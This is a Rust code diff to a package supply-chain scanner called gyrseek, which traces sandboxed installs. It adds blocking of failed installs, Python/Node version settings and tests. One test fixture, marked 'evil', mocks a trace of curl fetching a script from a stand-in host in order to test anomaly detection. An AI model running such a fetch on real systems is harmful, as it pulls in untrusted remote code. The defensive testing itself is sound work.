@@ -8,7 +8,7 @@ use dns_lookup::{lookup_addr, lookup_host};
 use regex::Regex;
 use serde::Deserialize;
 
-use crate::sandbox::SandboxRunner;
+use crate::sandbox::{InstallFailure, SandboxRunner};
 
 /// Policy knobs resolved from the YAML config (or defaults), passed by reference
 /// into the scanner so call sites don't have to thread a dozen positional args.
@@ -34,6 +34,14 @@ pub(crate) struct PolicyConfig {
     pub release_burst_threshold: Option<usize>,
     pub release_burst_window_hours: usize,
     pub minimum_release_age_package: Option<usize>,
+    /// Wall-clock limit (seconds) for one install probe; a probe that exceeds it blocks the scan.
+    pub probe_timeout_seconds: usize,
+    /// Python minor version (`3.11`) for the Python sandbox image; `None` means use
+    /// `.python-version`, then the default.
+    pub python_version: Option<String>,
+    /// Node major version (`22`) for the npm/pnpm sandbox image; `None` means use
+    /// `.nvmrc`/`.node-version`/`engines.node`, then the default.
+    pub node_version: Option<String>,
     /// Watched-process signatures (`bun|run|build`) or bare executables (`bun`)
     /// that are explicitly allowed even when newly introduced.
     pub process_exec_allowlist: HashMap<String, HashSet<String>>,
@@ -58,6 +66,9 @@ impl Default for PolicyConfig {
             release_burst_threshold: None,
             release_burst_window_hours: 24,
             minimum_release_age_package: None,
+            probe_timeout_seconds: crate::sandbox::DEFAULT_PROBE_TIMEOUT_SECS,
+            python_version: None,
+            node_version: None,
             process_exec_allowlist: HashMap::new(),
             artifact_allowlist: HashMap::new(),
             sensitive_file_access_allowlist: HashMap::new(),
@@ -122,6 +133,8 @@ struct TraceSignals {
     /// Used as a fallback when FCrDNS is unavailable (e.g. CDN edge IPs
     /// without PTR records).
     dns_map: HashMap<String, Vec<IpAddr>>,
+    /// Set when the package manager's install command failed inside the probe.
+    install_failure: Option<InstallFailure>,
 }
 
 #[derive(Clone)]
@@ -1036,7 +1049,9 @@ fn trace_sandbox_install_matrix(
     let traces = runner.trace_install_matrix(manager, probes)?;
     let mut by_probe: HashMap<(String, String), TraceSignals> = HashMap::new();
 
-    for ((package, version), stderr_str) in traces {
+    for probe_trace in traces {
+        let (package, version) = probe_trace.probe;
+        let stderr_str = probe_trace.trace;
         let trace = strip_artifact_section(&stderr_str);
         let raw_artifact_lines = extract_artifact_findings(&stderr_str);
         let artifact_findings = classify_inventory_lines(raw_artifact_lines);
@@ -1047,11 +1062,64 @@ fn trace_sandbox_install_matrix(
             artifact_findings,
             sensitive_file_reads: extract_sensitive_file_reads(trace),
             dns_map: extract_dns_map(trace),
+            install_failure: probe_trace.install_failure,
         };
         by_probe.insert((package, version), signals);
     }
 
     Ok(by_probe)
+}
+
+/// The message shown when a probe's install failed in the sandbox. It says plainly
+/// that this is the package manager's error, not gyrseek's, and what to do next.
+fn install_failed_message(
+    manager: &str,
+    package: &str,
+    failures: &[(String, InstallFailure)],
+    sandbox: Option<&str>,
+) -> String {
+    let image_var = if matches!(manager, "npm" | "pnpm") {
+        "GYRSEEK_NPM_SCANNER_IMAGE"
+    } else {
+        "GYRSEEK_PY_SCANNER_IMAGE"
+    };
+    let version_hint = if matches!(manager, "npm" | "pnpm") {
+        "add a `.nvmrc` file (or set `node_version` in your gyrseek config)"
+    } else {
+        "add a `.python-version` file (or set `python_version` in your gyrseek config)"
+    };
+    let versions = failures
+        .iter()
+        .map(|(v, f)| format!("{v} (exit code {})", f.exit_code))
+        .collect::<Vec<_>>()
+        .join(", ");
+    let mut msg = format!(
+        "❌ [gyrseek] install_failed: the sandbox install of '{package}' failed for {versions}.\n\
+This is not a gyrseek error. It is an error from your package manager ({manager}) while installing or resolving dependencies for this package. gyrseek cannot observe or vouch for a package that does not install, so it blocked it.\n\
+To fix: run the same install on its own, resolve the error, and run gyrseek again.\n\
+The sandbox is a locked-down Linux container (its own Python/Node, no compiler, a small non-executable /tmp), so a package that must be built from source (no prebuilt wheel) can fail there even though it installs on your machine. If the error below looks like that, point {image_var} at an image that matches your project."
+    );
+    if let Some(sandbox) = sandbox {
+        msg.push_str(&format!(
+            "\nThe sandbox ran this install with {sandbox}. If your project uses a different version, {version_hint} and run gyrseek again."
+        ));
+    }
+    for (version, failure) in failures {
+        if failure.output.is_empty() {
+            msg.push_str(&format!(
+                "\nNo error output was captured for {version} (host mode); run the install yourself to see it."
+            ));
+        } else {
+            msg.push_str(&format!(
+                "\nPackage manager output for {version} (exit code {}):",
+                failure.exit_code
+            ));
+            for line in failure.output.lines() {
+                msg.push_str(&format!("\n  | {line}"));
+            }
+        }
+    }
+    msg
 }
 
 /// Extracts both IPv4 and IPv6 connection endpoints from an strace trace.
@@ -2214,16 +2282,14 @@ pub(crate) async fn scan_packages_versions(
     for plan in plans {
         let key = format!("{}|{}", plan.package, plan.target_version);
         let resolved_version = plan.current.clone();
-        let blocked = |results: &mut HashMap<String, ScanReport>, key: String| {
+        let blocked = |results: &mut HashMap<String, ScanReport>, key: String, reason: &str| {
             let entry = results.entry(key).or_insert(ScanReport {
                 allowed: false,
                 resolved_version: resolved_version.clone(),
                 blocked_reasons: vec![],
             });
             entry.allowed = false;
-            entry
-                .blocked_reasons
-                .push("sandbox_trace_missing".to_string());
+            entry.blocked_reasons.push(reason.to_string());
         };
         let current_key = (plan.package.clone(), plan.current.clone());
         let current_signals = match traces_by_probe.get(&current_key) {
@@ -2233,10 +2299,15 @@ pub(crate) async fn scan_packages_versions(
                     "❌ [gyrseek] Sandbox trace missing for '{}@{}'.",
                     plan.package, plan.current
                 );
-                blocked(&mut results, key);
+                blocked(&mut results, key, "sandbox_trace_missing");
                 continue;
             }
         };
+        let mut install_failures: Vec<(String, InstallFailure)> = current_signals
+            .install_failure
+            .iter()
+            .map(|f| (plan.current.clone(), f.clone()))
+            .collect();
         let ips_curr = current_signals.ips;
         let git_curr = current_signals.git_clone_signatures;
         let proc_curr = current_signals.process_exec_signatures;
@@ -2264,6 +2335,9 @@ pub(crate) async fn scan_packages_versions(
                     baseline_artifact_findings.extend(found.artifact_findings.iter().cloned());
                     baseline_sensitive_reads.extend(found.sensitive_file_reads.iter().cloned());
                     baseline_dns_domains.extend(found.dns_map.keys().cloned());
+                    if let Some(f) = &found.install_failure {
+                        install_failures.push((v.clone(), f.clone()));
+                    }
                 }
                 None => {
                     println!(
@@ -2275,12 +2349,37 @@ pub(crate) async fn scan_packages_versions(
             }
         }
 
+        // A failed install blocks the package. When only the candidate failed, its trace is
+        // still compared with the complete baselines so anything it did before failing (a
+        // new program, a credential read) is reported too. A failed baseline leaves nothing
+        // trustworthy to compare against, so the package is blocked on that alone.
+        let baseline_failed = install_failures.iter().any(|(v, _)| *v != plan.current);
+        let candidate_failed_alone = !install_failures.is_empty() && !baseline_failed;
+        if !install_failures.is_empty() {
+            println!(
+                "{}",
+                install_failed_message(
+                    manager,
+                    &plan.package,
+                    &install_failures,
+                    runner.sandbox_description(manager).as_deref(),
+                )
+            );
+            blocked(&mut results, key.clone(), "install_failed");
+            if !candidate_failed_alone {
+                continue;
+            }
+        }
+
         if missing {
-            blocked(&mut results, key);
+            blocked(&mut results, key, "sandbox_trace_missing");
             continue;
         }
 
-        if plan.new_package_exempt && plan.baselines.len() < plan.baseline_threshold {
+        if plan.new_package_exempt
+            && plan.baselines.len() < plan.baseline_threshold
+            && !candidate_failed_alone
+        {
             println!(
                 "⚠️ [gyrseek] New package exemption applied for '{}': only {} eligible baseline version(s) available (<{}). Skipping anomaly block for now.",
                 plan.package,
@@ -2520,7 +2619,7 @@ pub(crate) async fn scan_packages_versions(
             package_blocked = true;
         }
 
-        if package_blocked {
+        if package_blocked || candidate_failed_alone {
             continue;
         }
 
@@ -5144,7 +5243,11 @@ read(6, "\x00\x44\x00\x00\x81\x80\x00\x01\x00\x02\x00\x00\x00\x00\x03\x66\x6f\x6
             let mut results = Vec::new();
             for probe in probes {
                 if let Some(trace) = self.traces.get(probe) {
-                    results.push((probe.clone(), trace.clone()));
+                    results.push(crate::sandbox::ProbeTrace {
+                        probe: probe.clone(),
+                        trace: trace.clone(),
+                        install_failure: None,
+                    });
                 }
             }
             Ok(results)
@@ -5685,6 +5788,347 @@ read(6, "\x00\x44\x00\x00\x81\x80\x00\x01\x00\x02\x00\x00\x00\x00\x03\x66\x6f\x6
                 .blocked_reasons
                 .contains(&"sandbox_trace_missing".to_string()),
             "must push sandbox_trace_missing block reason"
+        );
+    }
+
+    /// Wraps `MockRunner` and marks chosen probes as failed installs.
+    struct FailingInstallRunner {
+        inner: MockRunner,
+        failing: HashMap<(String, String), crate::sandbox::InstallFailure>,
+    }
+
+    impl crate::sandbox::SandboxRunner for FailingInstallRunner {
+        fn trace_install(&self, m: &str, p: &str, v: &str) -> Result<String, String> {
+            self.inner.trace_install(m, p, v)
+        }
+
+        fn trace_install_matrix(
+            &self,
+            m: &str,
+            probes: &[(String, String)],
+        ) -> Result<Vec<crate::sandbox::ProbeTrace>, String> {
+            let mut traces = self.inner.trace_install_matrix(m, probes)?;
+            for t in &mut traces {
+                t.install_failure = self.failing.get(&t.probe).cloned();
+            }
+            Ok(traces)
+        }
+    }
+
+    async fn scan_with_failing(failing: &[&str]) -> HashMap<String, super::ScanReport> {
+        let _env = EnvVarGuard::set("GYRSEEK_TEST_FORCE_RELEASES_LAST_24H", "0");
+        let trace = "execve(\"/usr/bin/sh\", [\"sh\", \"-c\", \"echo ok\"], 0x7ff) = 0\n";
+        let versions = ["2.0.0", "1.9.0", "1.8.0"];
+        let runner = FailingInstallRunner {
+            inner: MockRunner {
+                traces: versions
+                    .iter()
+                    .map(|v| (("pkg".to_string(), v.to_string()), trace.to_string()))
+                    .collect(),
+            },
+            failing: failing
+                .iter()
+                .map(|v| {
+                    (
+                        ("pkg".to_string(), v.to_string()),
+                        crate::sandbox::InstallFailure {
+                            exit_code: 1,
+                            output: "error: No solution found".to_string(),
+                        },
+                    )
+                })
+                .collect(),
+        };
+        let policy = PolicyConfig {
+            baseline_count: 2,
+            baseline_overrides: HashMap::from([(
+                "pkg".to_string(),
+                (Some("1.9.0".to_string()), Some("1.8.0".to_string())),
+            )]),
+            ..PolicyConfig::default()
+        };
+        scan_packages_versions(
+            &runner,
+            "pip",
+            &[("pkg".to_string(), "2.0.0".to_string())],
+            &policy,
+        )
+        .await
+    }
+
+    #[tokio::test]
+    async fn failed_candidate_install_blocks_with_install_failed() {
+        let results = scan_with_failing(&["2.0.0"]).await;
+        let report = results.get("pkg|2.0.0").expect("should have result");
+        assert!(!report.allowed);
+        assert_eq!(report.blocked_reasons, vec!["install_failed".to_string()]);
+    }
+
+    #[tokio::test]
+    async fn failed_baseline_install_also_blocks_with_install_failed() {
+        let results = scan_with_failing(&["1.8.0"]).await;
+        let report = results.get("pkg|2.0.0").expect("should have result");
+        assert!(!report.allowed);
+        assert_eq!(report.blocked_reasons, vec!["install_failed".to_string()]);
+    }
+
+    /// Candidate 2.0.0 runs `curl` (new behaviour); both baselines only run `sh`.
+    async fn scan_with_new_exec_and_failures(failing: &[&str]) -> Vec<String> {
+        let _env = EnvVarGuard::set("GYRSEEK_TEST_FORCE_RELEASES_LAST_24H", "0");
+        let base = "execve(\"/usr/bin/sh\", [\"sh\", \"-c\", \"echo ok\"], 0x7ff) = 0\n";
+        let evil = "execve(\"/usr/bin/curl\", [\"curl\", \"https://x.example/p.sh\"], 0x7ff) = 0\n";
+        let runner = FailingInstallRunner {
+            inner: MockRunner {
+                traces: HashMap::from([
+                    (("pkg".to_string(), "2.0.0".to_string()), evil.to_string()),
+                    (("pkg".to_string(), "1.9.0".to_string()), base.to_string()),
+                    (("pkg".to_string(), "1.8.0".to_string()), base.to_string()),
+                ]),
+            },
+            failing: failing
+                .iter()
+                .map(|v| {
+                    (
+                        ("pkg".to_string(), v.to_string()),
+                        crate::sandbox::InstallFailure {
+                            exit_code: 1,
+                            output: "error: boom".to_string(),
+                        },
+                    )
+                })
+                .collect(),
+        };
+        let policy = PolicyConfig {
+            baseline_count: 2,
+            baseline_overrides: HashMap::from([(
+                "pkg".to_string(),
+                (Some("1.9.0".to_string()), Some("1.8.0".to_string())),
+            )]),
+            ..PolicyConfig::default()
+        };
+        let results = scan_packages_versions(
+            &runner,
+            "pip",
+            &[("pkg".to_string(), "2.0.0".to_string())],
+            &policy,
+        )
+        .await;
+        let report = results.get("pkg|2.0.0").expect("should have result");
+        assert!(!report.allowed);
+        report.blocked_reasons.clone()
+    }
+
+    #[tokio::test]
+    async fn a_candidate_that_ran_something_new_before_failing_reports_both() {
+        let reasons = scan_with_new_exec_and_failures(&["2.0.0"]).await;
+        assert!(
+            reasons.contains(&"install_failed".to_string()),
+            "{reasons:?}"
+        );
+        assert!(
+            reasons.contains(&"process_exec_anomaly".to_string()),
+            "what the candidate did before failing must be reported too: {reasons:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_failed_baseline_blocks_on_install_failed_alone() {
+        // The baseline trace is incomplete, so comparing against it would only add noise.
+        let reasons = scan_with_new_exec_and_failures(&["1.8.0"]).await;
+        assert_eq!(reasons, vec!["install_failed".to_string()]);
+    }
+
+    #[tokio::test]
+    async fn a_failed_install_blocks_only_its_own_package_in_a_batch() {
+        let _env = EnvVarGuard::set("GYRSEEK_TEST_FORCE_RELEASES_LAST_24H", "0");
+        let trace = "execve(\"/usr/bin/sh\", [\"sh\", \"-c\", \"echo ok\"], 0x7ff) = 0\n";
+        let mut traces = HashMap::new();
+        let mut overrides = HashMap::new();
+        for pkg in ["pkg-a", "pkg-b", "pkg-c"] {
+            for v in ["2.0.0", "1.9.0", "1.8.0"] {
+                traces.insert((pkg.to_string(), v.to_string()), trace.to_string());
+            }
+            overrides.insert(
+                pkg.to_string(),
+                (Some("1.9.0".to_string()), Some("1.8.0".to_string())),
+            );
+        }
+        let failing = [("pkg-a", "2.0.0"), ("pkg-c", "1.8.0")]
+            .into_iter()
+            .map(|(p, v)| {
+                (
+                    (p.to_string(), v.to_string()),
+                    crate::sandbox::InstallFailure {
+                        exit_code: 1,
+                        output: "error: boom".to_string(),
+                    },
+                )
+            })
+            .collect();
+        let runner = FailingInstallRunner {
+            inner: MockRunner { traces },
+            failing,
+        };
+        let policy = PolicyConfig {
+            baseline_count: 2,
+            baseline_overrides: overrides,
+            ..PolicyConfig::default()
+        };
+        let targets: Vec<_> = ["pkg-a", "pkg-b", "pkg-c"]
+            .iter()
+            .map(|p| (p.to_string(), "2.0.0".to_string()))
+            .collect();
+        let results = scan_packages_versions(&runner, "pip", &targets, &policy).await;
+        let allowed = |k: &str| results.get(k).map(|r| r.allowed);
+        assert_eq!(allowed("pkg-a|2.0.0"), Some(false), "candidate failed");
+        assert_eq!(
+            allowed("pkg-b|2.0.0"),
+            Some(true),
+            "an untouched package must still pass"
+        );
+        assert_eq!(allowed("pkg-c|2.0.0"), Some(false), "a baseline failed");
+        assert_eq!(results["pkg-a|2.0.0"].blocked_reasons, ["install_failed"]);
+        assert_eq!(results["pkg-c|2.0.0"].blocked_reasons, ["install_failed"]);
+    }
+
+    #[tokio::test]
+    async fn a_new_package_exemption_cannot_clear_a_failed_install() {
+        let _env = EnvVarGuard::set("GYRSEEK_TEST_FORCE_RELEASES_LAST_24H", "0");
+        let mut runner_traces = HashMap::new();
+        runner_traces.insert(("new-pkg".to_string(), "1.0.0".to_string()), String::new());
+        let runner = FailingInstallRunner {
+            inner: MockRunner {
+                traces: runner_traces,
+            },
+            failing: HashMap::from([(
+                ("new-pkg".to_string(), "1.0.0".to_string()),
+                crate::sandbox::InstallFailure {
+                    exit_code: 1,
+                    output: "error: boom".to_string(),
+                },
+            )]),
+        };
+        let policy = PolicyConfig {
+            baseline_count: 2,
+            new_package_exemptions: [("new-pkg".to_string(), "1.0.0".to_string())]
+                .into_iter()
+                .collect(),
+            ..PolicyConfig::default()
+        };
+        let results = scan_packages_versions(
+            &runner,
+            "pip",
+            &[("new-pkg".to_string(), "1.0.0".to_string())],
+            &policy,
+        )
+        .await;
+        let report = results.get("new-pkg|1.0.0").expect("result");
+        assert!(
+            !report.allowed,
+            "the exemption must not hide a failed install"
+        );
+        assert!(
+            report
+                .blocked_reasons
+                .contains(&"install_failed".to_string())
+        );
+    }
+
+    #[test]
+    fn install_failed_message_edge_cases() {
+        let failure = |code: i32, output: &str| crate::sandbox::InstallFailure {
+            exit_code: code,
+            output: output.to_string(),
+        };
+        // Negative and large exit codes are shown as they are.
+        let msg = super::install_failed_message(
+            "npm",
+            "left-pad",
+            &[
+                ("1.3.0".to_string(), failure(-1, "x")),
+                ("1.2.0".to_string(), failure(255, "y")),
+            ],
+            None,
+        );
+        assert!(
+            msg.contains("1.3.0 (exit code -1)") && msg.contains("1.2.0 (exit code 255)"),
+            "{msg}"
+        );
+        // Without a sandbox description no "ran this install with" line is printed.
+        assert!(!msg.contains("ran this install with"), "{msg}");
+        // pnpm gets the npm image hint, poetry/uv/pip the Python one.
+        assert!(
+            super::install_failed_message("pnpm", "p", &[("1".into(), failure(1, "e"))], None)
+                .contains("GYRSEEK_NPM_SCANNER_IMAGE")
+        );
+        for m in ["pip", "pip3", "uv", "poetry"] {
+            assert!(
+                super::install_failed_message(m, "p", &[("1".into(), failure(1, "e"))], None)
+                    .contains("GYRSEEK_PY_SCANNER_IMAGE"),
+                "{m}"
+            );
+        }
+        // Multi-line output keeps every line, each indented.
+        let msg =
+            super::install_failed_message("uv", "p", &[("1".into(), failure(1, "a\nb\nc"))], None);
+        assert!(msg.contains("  | a\n  | b\n  | c"), "{msg}");
+    }
+
+    #[tokio::test]
+    async fn clean_installs_are_not_blocked_by_install_failed() {
+        let results = scan_with_failing(&[]).await;
+        let report = results.get("pkg|2.0.0").expect("should have result");
+        assert!(report.allowed, "{:?}", report.blocked_reasons);
+    }
+
+    #[test]
+    fn install_failed_message_names_versions_codes_and_who_owns_the_error() {
+        let failures = vec![
+            (
+                "2.2.2".to_string(),
+                crate::sandbox::InstallFailure {
+                    exit_code: 1,
+                    output: "error: Failed to build `pandas`\nUnknown compiler(s)".to_string(),
+                },
+            ),
+            (
+                "2.2.1".to_string(),
+                crate::sandbox::InstallFailure {
+                    exit_code: 2,
+                    output: String::new(),
+                },
+            ),
+        ];
+        let msg = super::install_failed_message(
+            "uv",
+            "pandas",
+            &failures,
+            Some("Python 3.11 (from .python-version)"),
+        );
+        assert!(msg.contains("ran this install with Python 3.11 (from .python-version)"));
+        assert!(msg.contains("add a `.python-version` file"));
+        assert!(
+            super::install_failed_message(
+                "npm",
+                "left-pad",
+                &failures,
+                Some("Node 22 (from .nvmrc)")
+            )
+            .contains("add a `.nvmrc` file")
+        );
+        assert!(msg.contains("install_failed"));
+        assert!(msg.contains("2.2.2 (exit code 1)"));
+        assert!(msg.contains("2.2.1 (exit code 2)"));
+        assert!(msg.contains("This is not a gyrseek error"));
+        assert!(msg.contains("error from your package manager (uv)"));
+        assert!(msg.contains("run gyrseek again"));
+        assert!(msg.contains("GYRSEEK_PY_SCANNER_IMAGE"));
+        assert!(msg.contains("built from source"));
+        assert!(msg.contains("  | Unknown compiler(s)"));
+        assert!(msg.contains("No error output was captured for 2.2.1"));
+        assert!(
+            super::install_failed_message("npm", "left-pad", &failures, None)
+                .contains("GYRSEEK_NPM_SCANNER_IMAGE")
         );
     }
 
